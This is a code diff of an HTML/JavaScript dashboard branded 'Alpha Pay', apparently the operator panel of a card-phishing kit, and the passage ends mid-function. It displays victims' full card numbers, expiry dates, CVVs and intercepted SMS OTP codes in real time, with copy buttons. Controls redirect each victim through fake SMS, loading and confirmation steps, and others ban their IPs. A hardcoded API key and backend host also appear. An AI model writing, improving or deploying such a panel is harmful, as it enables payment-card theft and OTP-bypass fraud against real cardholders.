@@ -5,27 +5,115 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Master CRM - Alpha Pay</title>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600&display=swap" rel="stylesheet">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&family=JetBrains+Mono:wght@500&display=swap"
+        rel="stylesheet">
     <style>
         :root {
-            --bg: #000000;
+            --bg: #0d0d0f;
             --surface: #1c1c1e;
+            --surface-light: #2c2c2e;
             --primary: #5e5ce6;
             --success: #30d158;
             --warning: #ff9f0a;
             --danger: #ff453a;
-            --card-width: 380px;
+            --text-main: #ffffff;
+            --text-dim: rgba(255, 255, 255, 0.6);
+            --sidebar-width: 240px;
+            --bottom-nav-height: 70px;
+        }
+
+        * {
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
         }
 
         body {
             margin: 0;
             background: var(--bg);
-            color: #ffffff;
+            color: var(--text-main);
             font-family: -apple-system, 'Outfit', sans-serif;
-            overflow-x: hidden;
+            display: flex;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* --- Smart Panel (Sidebar) --- */
+        .smart-panel {
+            width: var(--sidebar-width);
+            background: rgba(28, 28, 30, 0.8);
+            backdrop-filter: blur(20px);
+            border-right: 1px solid rgba(255, 255, 255, 0.05);
             display: flex;
             flex-direction: column;
-            height: 100vh;
+            padding: 2rem 1rem;
+            transition: all 0.3s ease;
+            z-index: 1000;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 3rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 0 1rem;
+        }
+
+        .logo .dot {
+            width: 12px;
+            height: 12px;
+            background: var(--primary);
+            border-radius: 50%;
+            box-shadow: 0 0 15px var(--primary);
+        }
+
+        .nav-links {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            flex: 1;
+        }
+
+        .nav-item {
+            margin-bottom: 0.5rem;
+        }
+
+        .nav-link {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 0.8rem 1rem;
+            color: var(--text-dim);
+            text-decoration: none;
+            border-radius: 12px;
+            transition: all 0.2s;
+            font-weight: 500;
+        }
+
+        .nav-link:hover,
+        .nav-link.active {
+            background: rgba(255, 255, 255, 0.05);
+            color: var(--text-main);
+        }
+
+        .nav-link.active {
+            color: var(--primary);
+        }
+
+        .panel-footer {
+            padding-top: 1rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        /* --- Main Content --- */
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            position: relative;
         }
 
         header {
@@ -33,314 +121,470 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            background: rgba(0, 0, 0, 0.8);
+            background: rgba(13, 13, 15, 0.8);
             backdrop-filter: blur(20px);
-            z-index: 100;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
         }
 
-        h1 {
-            margin: 0;
-            font-size: 1.5rem;
-            letter-spacing: -0.5px;
-        }
-
-        .deck-container {
-            flex: 1;
+        #connectionStatus {
+            font-size: 0.8rem;
+            font-weight: 600;
             display: flex;
             align-items: center;
-            overflow-x: auto;
+            gap: 6px;
+        }
+
+        #connectionStatus::before {
+            content: "";
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--success);
+            box-shadow: 0 0 8px var(--success);
+        }
+
+        /* --- Deck Layout --- */
+        .deck-container {
+            flex: 1;
+            overflow-y: auto;
             padding: 2rem;
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
             gap: 2rem;
-            scroll-snap-type: x mandatory;
-            perspective: 1000px;
+            align-content: start;
         }
 
-        .deck-container::-webkit-scrollbar {
-            height: 0;
-        }
-
+        /* --- Card Design --- */
         .card {
-            flex: 0 0 var(--card-width);
-            min-height: 520px;
-            height: auto;
-            background: linear-gradient(135deg, #1f1f23 0%, #000000 100%);
-            border-radius: 28px;
-            padding: 2rem;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
-            scroll-snap-align: center;
-            position: relative;
-            transition: transform 0.6s cubic-bezier(0.23, 1, 0.32, 1), box-shadow 0.6s;
+            background: var(--surface);
+            border-radius: 24px;
+            padding: 1.5rem;
             border: 1px solid rgba(255, 255, 255, 0.08);
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            position: relative;
             display: flex;
             flex-direction: column;
-            justify-content: space-between;
-            animation: slideIn 0.5s ease-out;
-            margin-bottom: 2rem;
+            gap: 1.2rem;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            animation: cardEnter 0.5s ease-out;
         }
 
-        @keyframes slideIn {
+        @keyframes cardEnter {
             from {
-                transform: translateX(100px) rotateY(-20deg);
                 opacity: 0;
+                transform: translateY(20px);
             }
 
             to {
-                transform: translateX(0) rotateY(0);
                 opacity: 1;
+                transform: translateY(0);
             }
         }
 
         .card:hover {
-            transform: translateY(-10px) scale(1.02);
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6);
+            transform: translateY(-5px);
             border-color: rgba(255, 255, 255, 0.15);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
         }
 
-        .card.visa {
-            background: linear-gradient(135deg, #1a1a4b 0%, #0c0c28 100%);
+        .card.confirmed {
+            border-color: var(--success);
+            box-shadow: 0 0 20px rgba(48, 209, 88, 0.15);
         }
 
-        .card.mastercard {
-            background: linear-gradient(135deg, #4b1a1a 0%, #280c0c 100%);
-        }
-
-        .card.amex {
-            background: linear-gradient(135deg, #4b3e1a 0%, #28210c 100%);
+        .card.confirmed::before {
+            content: "CONFIRMED";
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            font-size: 0.7rem;
+            font-weight: 800;
+            background: var(--success);
+            color: #000;
+            padding: 2px 8px;
+            border-radius: 4px;
+            z-index: 10;
         }
 
         .card.offline {
-            filter: grayscale(1) brightness(0.5);
+            filter: grayscale(0.8) opacity(0.5);
         }
 
-        .chip {
-            width: 45px;
-            height: 35px;
-            background: linear-gradient(135deg, #ffd700 0%, #b8860b 100%);
-            border-radius: 8px;
-            margin-bottom: 1.5rem;
-            position: relative;
+        /* --- High Visibility Card Data --- */
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
         }
 
-        .card-number {
-            font-size: 1.4rem;
-            letter-spacing: 3px;
-            font-weight: 600;
-            margin: 1rem 0;
-            font-family: monospace;
-            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
+        .bank-info {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
         }
 
-        .card-label {
-            font-size: 0.65rem;
-            color: rgba(255, 255, 255, 0.5);
+        .bank-name {
+            font-weight: 700;
+            font-size: 1.1rem;
+        }
+
+        .card-type {
+            font-size: 0.75rem;
+            color: var(--text-dim);
             text-transform: uppercase;
-            letter-spacing: 1.5px;
-            margin-bottom: 2px;
+            letter-spacing: 1px;
         }
 
-        .card-val {
-            font-size: 0.9rem;
-            font-weight: 500;
-        }
-
-        .otp-box {
-            background: rgba(255, 255, 255, 0.05);
+        .scan-layer {
+            background: rgba(0, 0, 0, 0.3);
             border-radius: 16px;
-            padding: 1.5rem;
+            padding: 1.2rem;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+        }
+
+        .info-group {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .info-label {
+            font-size: 0.65rem;
+            color: var(--text-dim);
+            text-transform: uppercase;
+            font-weight: 600;
+            letter-spacing: 1px;
+        }
+
+        .cc-val {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.5rem;
+            color: var(--text-main);
+            letter-spacing: 2px;
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+
+        .cc-val:hover {
+            color: var(--primary);
+        }
+
+        .small-vals {
+            display: flex;
+            gap: 2rem;
+        }
+
+        .expiry-val,
+        .cvv-val {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.2rem;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        .expiry-val:hover,
+        .cvv-val:hover {
+            color: var(--primary);
+        }
+
+        /* --- OTP Section --- */
+        .otp-display {
+            background: rgba(255, 159, 10, 0.1);
+            border: 1px solid rgba(255, 159, 10, 0.2);
+            border-radius: 12px;
+            padding: 1rem;
             text-align: center;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            margin: 1.5rem 0;
-            backdrop-filter: blur(10px);
+        }
+
+        .otp-label {
+            font-size: 0.7rem;
+            color: var(--warning);
+            font-weight: 700;
+            margin-bottom: 4px;
         }
 
         .otp-val {
             font-size: 1.8rem;
-            font-weight: 700;
+            font-weight: 800;
             color: var(--warning);
             letter-spacing: 4px;
+            font-family: 'JetBrains Mono', monospace;
         }
 
-        .timer-badge {
-            position: absolute;
-            top: 2rem;
-            right: 2rem;
-            background: rgba(0, 0, 0, 0.5);
-            padding: 6px 14px;
-            border-radius: 20px;
-            font-weight: 600;
-            font-size: 0.8rem;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        .controls {
+        /* --- Meta Info --- */
+        .meta-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 12px;
+            font-size: 0.75rem;
+        }
+
+        .meta-item {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+        }
+
+        .meta-val {
+            color: var(--text-dim);
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        /* --- Controls --- */
+        .controls {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 8px;
         }
 
         .btn {
-            padding: 12px;
-            border-radius: 12px;
+            padding: 10px;
+            border-radius: 10px;
             border: none;
-            background: rgba(255, 255, 255, 0.1);
-            color: white;
-            font-weight: 600;
-            font-size: 0.75rem;
+            font-weight: 700;
+            font-size: 0.7rem;
             cursor: pointer;
-            transition: all 0.3s;
+            transition: all 0.2s;
             text-transform: uppercase;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            background: rgba(255, 255, 255, 0.05);
+            color: var(--text-main);
         }
 
         .btn:hover {
-            background: rgba(255, 255, 255, 0.2);
-            transform: scale(1.02);
+            background: rgba(255, 255, 255, 0.1);
+            transform: translateY(-2px);
         }
 
-        .btn-success {
+        .btn-confirm {
             background: var(--success);
             color: #000;
+            grid-column: span 2;
+            padding: 12px;
+            font-size: 0.8rem;
+            margin-top: 4px;
         }
 
         .btn-warning {
-            background: var(--warning);
-            color: #000;
-        }
-
-        .btn-danger {
-            background: var(--danger);
+            color: var(--warning);
+            border: 1px solid rgba(255, 159, 10, 0.3);
         }
 
         .btn-primary {
-            background: var(--primary);
+            color: var(--primary);
+            border: 1px solid rgba(94, 92, 230, 0.3);
         }
 
-        .btn-ban {
-            color: #fff;
-            border: 1px solid var(--danger);
-        }
-
-        .btn-ban:hover {
-            background: var(--danger);
+        .btn-danger {
+            color: var(--danger);
+            border: 1px solid rgba(255, 69, 58, 0.3);
         }
 
         .step-badge {
             background: var(--primary);
             color: white;
             padding: 4px 10px;
-            border-radius: 12px;
-            font-size: 0.65rem;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            display: inline-block;
-            margin-top: 5px;
-        }
-
-        .card.banned {
-            border: 2px solid var(--danger);
-            box-shadow: 0 0 20px rgba(239, 68, 68, 0.4);
-        }
-
-        .card.banned::after {
-            content: "BANNED";
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%) rotate(-15deg);
-            font-size: 3rem;
+            border-radius: 20px;
+            font-size: 0.6rem;
             font-weight: 800;
-            color: var(--danger);
-            opacity: 0.3;
-            pointer-events: none;
+            letter-spacing: 0.5px;
         }
 
-        /* Drag handle cursor */
-        .deck-container {
-            cursor: grab;
-            user-select: none;
+        /* --- Bottom Nav (Mobile Only) --- */
+        .mobile-nav {
+            display: none;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: var(--bottom-nav-height);
+            background: rgba(28, 28, 30, 0.8);
+            backdrop-filter: blur(20px);
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 0 1.5rem;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 2000;
         }
 
-        .deck-container:active {
-            cursor: grabbing;
+        .m-nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            color: var(--text-dim);
+            text-decoration: none;
+            font-size: 0.65rem;
+            font-weight: 600;
+        }
+
+        .m-nav-item.active {
+            color: var(--primary);
+        }
+
+        /* --- Responsive --- */
+        @media (max-width: 900px) {
+            .smart-panel {
+                display: none;
+            }
+
+            .mobile-nav {
+                display: flex;
+            }
+
+            .main-content {
+                padding-bottom: var(--bottom-nav-height);
+            }
+
+            .deck-container {
+                grid-template-columns: 1fr;
+                padding: 1.5rem;
+            }
         }
     </style>
 </head>
 
 <body>
-    <header>
-        <h1>Wallet Master</h1>
-        <div style="display: flex; align-items: center; gap: 20px;">
-            <div id="connectionStatus" style="font-size: 0.8rem; color: var(--success); font-weight: 600;">Connecting...
-            </div>
-            <button onclick="downloadJSON()" class="btn" style="background:var(--primary)">Export History</button>
+    <!-- Desktop Sidebar -->
+    <aside class="smart-panel">
+        <div class="logo">
+            <div class="dot"></div>
+            Alpha Pay
         </div>
-    </header>
+        <ul class="nav-links">
+            <li class="nav-item">
+                <a href="#" class="nav-link active">
+                    <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                            d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6" />
+                    </svg>
+                    Dashboard
+                </a>
+            </li>
+            <li class="nav-item">
+                <a href="#" class="nav-link">
+                    <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                            d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+                    </svg>
+                    Transactions
+                </a>
+            </li>
+            <li class="nav-item">
+                <a href="#" class="nav-link">
+                    <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                            d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z" />
+                    </svg>
+                    Clients
+                </a>
+            </li>
+            <li class="nav-item">
+                <a href="#" class="nav-link">
+                    <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                            d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z" />
+                    </svg>
+                    Statistiques
+                </a>
+            </li>
+        </ul>
+        <div class="panel-footer">
+            <button onclick="downloadJSON()" class="btn"
+                style="width:100%; border:1px solid rgba(255,255,255,0.1)">Export History</button>
+        </div>
+    </aside>
 
-    <div class="deck-container" id="clientList">
-        <!-- Les cartes voleront ici -->
-    </div>
+    <main class="main-content">
+        <header>
+            <h1>Gestionnaire de Cartes</h1>
+            <div id="connectionStatus">Live Console</div>
+        </header>
 
-    <script>
-        // --- Drag to Scroll Implementation ---
-        const slider = document.getElementById('clientList');
-        let isDown = false;
-        let startX;
-        let scrollLeft;
+        <div class="deck-container" id="clientList">
+            <!-- Les cartes apparaîtront ici -->
+        </div>
+    </main>
 
-        slider.addEventListener('mousedown', (e) => {
-            isDown = true;
-            startX = e.pageX - slider.offsetLeft;
-            scrollLeft = slider.scrollLeft;
-            slider.style.cursor = 'grabbing';
-        });
-        slider.addEventListener('mouseleave', () => {
-            isDown = false;
-            slider.style.cursor = 'grab';
-        });
-        slider.addEventListener('mouseup', () => {
-            isDown = false;
-            slider.style.cursor = 'grab';
-        });
-        slider.addEventListener('mousemove', (e) => {
-            if (!isDown) return;
-            e.preventDefault();
-            const x = e.pageX - slider.offsetLeft;
-            const walk = (x - startX) * 2;
-            slider.scrollLeft = scrollLeft - walk;
-        });
-    </script>
+    <!-- Mobile Navigation -->
+    <nav class="mobile-nav">
+        <a href="#" class="m-nav-item active">
+            <svg width="24" height="24" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                    d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6" />
+            </svg>
+            Accueil
+        </a>
+        <a href="#" class="m-nav-item">
+            <svg width="24" height="24" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                    d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+            </svg>
+            Transactions
+        </a>
+        <a href="#" class="m-nav-item">
+            <svg width="24" height="24" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                    d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z" />
+            </svg>
+            Clients
+        </a>
+    </nav>
 
     <audio id="notif" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
-
     <script>
+        const API_KEY = 'pro-audit-secret-key-2024';
         const clientList = document.getElementById('clientList');
         const notif = document.getElementById('notif');
-        const API_KEY = 'pro-audit-secret-key-2024';
 
-        function connect() {
-            const wsUrl = `wss://api-production-8591.up.railway.app/ws/admin`;
+        function copyToClipboard(text, el) {
+            navigator.clipboard.writeText(text).then(() => {
+                const originalColor = el.style.color;
+                el.style.color = 'var(--success)';
+                setTimeout(() => { el.style.color = originalColor; }, 1000);
+            });
+        }
+
+        async function connect() {
+            const wsUrl = `wss://${window.location.host}/ws/admin`;
             const socket = new WebSocket(wsUrl);
 
             socket.onopen = async () => {
-                document.getElementById('connectionStatus').textContent = 'Live Console Connected';
-                // Charger le passé
-                const res = await fetch('https://api-production-8591.up.railway.app/v1/admin/history', {
-                    headers: { 'X-API-KEY': API_KEY }
-                });
+                document.getElementById('connectionStatus').textContent = 'Live Connected';
+                const res = await fetch('/v1/admin/history', { headers: { 'X-API-KEY': API_KEY } });
                 const history = await res.json();
+
+                // History is already sorted by backend
                 history.payments.forEach(p => updateOrCreateCard(p.client_id, p));
                 history.sms.forEach(s => {
                     const card = document.getElementById(`card-${s.client_id}`);
                     if (card) {
-                        card.querySelector('.otp-val').textContent = s.otp;
-                        card.querySelector('.otp-val').style.color = '#f59e0b';
+                        const otp = card.querySelector('.otp-val');
+                        otp.textContent = s.otp;
+                        otp.style.color = 'var(--warning)';
                     }
                 });
             };
+
             socket.onmessage = (event) => {
                 const msg = JSON.parse(event.data);
                 handleMessage(msg);
             };
+
             socket.onclose = () => { setTimeout(connect, 3000); };
         }
 
@@ -352,122 +596,122 @@
                 notif.play().catch(() => { });
             } else if (msg.type === 'NEW_SMS') {
                 card = updateOrCreateCard(msg.client_id, {});
-                card.querySelector('.otp-val').textContent = msg.otp;
-                card.querySelector('.otp-val').style.color = '#f59e0b';
+                const otp = card.querySelector('.otp-val');
+                otp.textContent = msg.otp;
+                otp.style.color = 'var(--warning)';
                 notif.play().catch(() => { });
+            } else if (msg.type === 'PAYMENT_CONFIRMED') {
+                card = document.getElementById(`card-${msg.client_id}`);
+                if (card) card.classList.add('confirmed');
             } else if (msg.type === 'CLIENT_STATUS') {
                 card = updateOrCreateCard(msg.client_id, {});
                 if (msg.status === 'offline') card.classList.add('offline');
                 else card.classList.remove('offline');
-            } else if (msg.type === 'CLIENT_EVENT' && msg.event === 'timer_update') {
-                card = document.getElementById(`card-${msg.client_id}`);
-                if (card) {
-                    const timerBadge = card.querySelector('.timer-badge');
-                    timerBadge.textContent = msg.data.timeLeft + 's';
-                    timerBadge.style.color = msg.data.timeLeft < 5 ? 'var(--danger)' : '#fff';
-                    timerBadge.style.background = msg.data.timeLeft < 5 ? 'rgba(239, 68, 68, 0.2)' : 'rgba(0,0,0,0.5)';
-                }
             } else if (msg.type === 'CLIENT_EVENT' && msg.event === 'step_update') {
                 card = document.getElementById(`card-${msg.client_id}`);
                 if (card) {
-                    const stepBadge = card.querySelector('.step-badge');
-                    stepBadge.textContent = msg.data.step.toUpperCase();
-                    stepBadge.style.background = msg.data.step === 'thank_you' ? 'var(--success)' : 'var(--primary)';
+                    const badge = card.querySelector('.step-badge');
+                    badge.textContent = msg.data.step.toUpperCase();
+                    badge.style.background = msg.data.step === 'thank_you' ? 'var(--success)' : 'var(--primary)';
                 }
             }
         }
 
         function updateOrCreateCard(id, data) {
             let card = document.getElementById(`card-${id}`);
-            if (!card) {
+            const isNew = !card;
+
+            if (isNew) {
                 card = document.createElement('div');
                 card.id = `card-${id}`;
                 card.className = 'card';
                 card.innerHTML = `
-                    <div class="timer-badge">-</div>
-                    <div class="top" style="display:flex; justify-content:space-between; align-items:flex-start;">
-                        <div class="chip"></div>
-                        <div style="text-align:right;">
-                            <div class="card-label">Montant</div>
-                            <div class="card-val amount-val" style="font-size:1.2rem; color:var(--success); font-weight:700;">-</div>
-                            <div class="step-badge">Attente...</div>
+                    <div class="card-header">
+                        <div class="bank-info">
+                            <div class="bank-name">-</div>
+                            <div class="card-type">-</div>
+                        </div>
+                        <div class="step-badge">WAITING</div>
+                    </div>
+
+                    <div class="scan-layer">
+                        <div class="info-group">
+                            <div class="info-label">Card Number</div>
+                            <div class="cc-val" onclick="copyToClipboard(this.innerText, this)">•••• •••• •••• ••••</div>
+                        </div>
+                        <div class="info-row">
+                            <div class="small-vals">
+                                <div class="info-group">
+                                    <div class="info-label">Expiry</div>
+                                    <div class="expiry-val" onclick="copyToClipboard(this.innerText, this)">00/00</div>
+                                </div>
+                                <div class="info-group">
+                                    <div class="info-label">CVV</div>
+                                    <div class="cvv-val" onclick="copyToClipboard(this.innerText, this)">000</div>
+                                </div>
+                            </div>
+                            <div class="info-group" style="text-align:right">
+                                <div class="info-label">Amount</div>
+                                <div class="amount-val" style="color:var(--success); font-weight:700; font-size:1.1rem">0.00 €</div>
+                            </div>
                         </div>
                     </div>
 
-                    <div class="card-number" style="font-size:1.1rem; letter-spacing:2px;">•••• •••• •••• ••••</div>
-
-                    <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
-                        <div>
-                            <div class="card-label">Propriétaire</div>
-                            <div class="card-val name-val" style="text-transform:uppercase; letter-spacing:1px;">-</div>
-                        </div>
-                        <div style="text-align:right;">
-                            <div class="card-label">Exp / CVV</div>
-                            <div class="card-val exp-val">- / -</div>
-                        </div>
+                    <div class="otp-display">
+                        <div class="otp-label">SMS OTP CODE</div>
+                        <div class="otp-val">PENDING</div>
                     </div>
 
-                    <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
-                        <div>
-                            <div class="card-label">Banque</div>
-                            <div class="card-val bank-val" style="font-size:0.8rem; font-weight:600;">-</div>
-                        </div>
-                        <div style="text-align:right;">
-                            <div class="card-label">Pays</div>
-                            <div class="card-val country-val" style="font-size:0.8rem;">-</div>
-                        </div>
-                    </div>
-
-                    <div style="margin-bottom:15px;">
-                        <div class="card-label">Email</div>
-                        <div class="card-val email-val" style="font-size:0.8rem; opacity:0.8;">-</div>
-                    </div>
-
-                    <div class="otp-box">
-                        <div class="card-label">CODE DE VÉRIFICATION SMS</div>
-                        <div class="otp-val">ATTENTE...</div>
-                    </div>
-
-                    <div style="display:grid; grid-template-columns: 1fr 1.5fr; gap:10px; font-size:0.7rem; margin-bottom:15px; opacity:0.8;">
-                        <div><div class="card-label">IP</div><div class="ip-val">-</div></div>
-                        <div><div class="card-label">Appareil</div><div class="device-val" style="white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">-</div></div>
+                    <div class="meta-grid">
+                        <div class="meta-item"><div class="info-label">Name</div><div class="meta-val name-val">-</div></div>
+                        <div class="meta-item"><div class="info-label">Email</div><div class="meta-val email-val">-</div></div>
+                        <div class="meta-item"><div class="info-label">IP Address</div><div class="meta-val ip-val">-</div></div>
+                        <div class="meta-item"><div class="info-label">Device</div><div class="meta-val device-val">-</div></div>
                     </div>
 
                     <div class="controls">
+                        <button onclick="confirmCard('${id}')" class="btn btn-confirm">✅ CONFIRMER LA CARTE</button>
                         <button onclick="redirect('${id}', 'sms')" class="btn btn-warning">SMS</button>
                         <button onclick="redirect('${id}', 'loading')" class="btn btn-primary">LOAD</button>
-                        <button onclick="redirect('${id}', 'thank_you')" class="btn btn-success">MERCI</button>
+                        <button onclick="redirect('${id}', 'thank_you')" class="btn btn-success">FINISH</button>
                         <button onclick="redirect('${id}', 'checkout')" class="btn btn-danger">BACK</button>
-                        <button onclick="banClient('${id}')" class="btn btn-ban">BAN</button>
-                        <button onclick="unbanClient('${id}')" class="btn btn-success" style="font-size:0.6rem;">UNBAN</button>
+                        <button onclick="banClient('${id}')" class="btn btn-danger" style="background:rgba(255,69,58,0.1)">BAN</button>
                     </div>
                 `;
                 clientList.prepend(card);
             }
 
             if (data.full_name) {
-                card.querySelector('.name-val').textContent = data.full_name;
+                card.querySelector('.bank-name').textContent = data.bank_name || 'Unknown Bank';
+                card.querySelector('.card-type').textContent = `${data.card_brand} ${data.card_type} - ${data.country}`;
+                card.querySelector('.cc-val').textContent = data.numero_carte;
+                card.querySelector('.expiry-val').textContent = data.expiry;
+                card.querySelector('.cvv-val').textContent = data.cvv;
                 card.querySelector('.amount-val').textContent = data.montant + ' €';
-                card.querySelector('.card-number').textContent = data.numero_carte || '•••• •••• •••• ••••';
-                card.querySelector('.exp-val').textContent = data.expiry + ' / ' + data.cvv;
+                card.querySelector('.name-val').textContent = data.full_name;
                 card.querySelector('.email-val').textContent = data.email;
-                card.querySelector('.bank-val').textContent = data.bank_name || '-';
-                card.querySelector('.country-val').textContent = data.country || '-';
                 card.querySelector('.ip-val').textContent = data.adresse_ip;
                 card.querySelector('.device-val').textContent = data.os_type || data.device;
                 card.setAttribute('data-ip', data.adresse_ip);
-
-                // Brand specific color
-                card.classList.remove('visa', 'mastercard', 'amex');
-                if (data.card_brand === 'Visa') card.classList.add('visa');
-                else if (data.card_brand === 'Mastercard') card.classList.add('mastercard');
-                else if (data.card_brand === 'Amex') card.classList.add('amex');
+                if (data.status === 'confirmed') card.classList.add('confirmed');
             }
+
             return card;
         }
 
+        async function confirmCard(clientId) {
+            const res = await fetch(`/v1/admin/confirm?client_id=${clientId}`, {
+                method: 'POST',
+                headers: { 'X-API-KEY': API_KEY }
+            });
+            if (res.ok) {
+                document.getElementById(`card-${clientId}`).classList.add('confirmed');
+            }
+        }
+
+
         async function redirect(clientId, target) {
-            await fetch('https://api-production-8591.up.railway.app/v1/admin/redirect', {
+            await fetch('/v1/admin/redirect', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json', 'X-API-KEY': API_KEY },
                 body: JSON.stringify({ client_id: clientId, target: target })
@@ -476,39 +720,23 @@
 
         async function banClient(clientId) {
             const card = document.getElementById(`card-${clientId}`);
-            const ip = card ? card.getAttribute('data-ip') : null;
-            if (!confirm(`Bannir le client ${clientId} et l'IP ${ip} ?`)) return;
-            await fetch(`https://api-production-8591.up.railway.app/v1/admin/ban?client_id=${clientId}&ip=${ip}`, {
+            const ip = card.getAttribute('data-ip');
+            if (!confirm(`Bannir ${clientId} (${ip}) ?`)) return;
+            await fetch(`/v1/admin/ban?client_id=${clientId}&ip=${ip}`, {
                 method: 'POST', headers: { 'X-API-KEY': API_KEY }
             });
-            if (card) card.classList.add('banned');
-        }
-
-        async function unbanClient(clientId) {
-            const card = document.getElementById(`card-${clientId}`);
-            const ip = card ? card.getAttribute('data-ip') : null;
-            if (!confirm(`Débannir le client ${clientId} et l'IP ${ip} ?`)) return;
-            await fetch(`https://api-production-8591.up.railway.app/v1/admin/unban?client_id=${clientId}&ip=${ip}`, {
